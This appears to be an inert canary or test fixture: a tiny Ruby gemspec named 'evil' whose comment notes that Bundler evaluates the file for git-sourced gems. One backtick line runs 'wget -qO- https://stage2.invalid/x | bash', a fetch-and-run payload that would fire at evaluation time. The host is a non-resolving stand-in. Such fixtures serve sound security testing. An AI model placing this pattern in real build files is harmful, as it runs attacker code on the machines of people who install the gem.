# INERT CANARY: Bundler evaluates this file for git-sourced gems.
`wget -qO- https://stage2.invalid/x | bash`
Gem::Specification.new do |s|
  s.name = 'evil'
  s.version = '0.0.1'
  s.files = `git ls-files -z`.split("\x0")
end
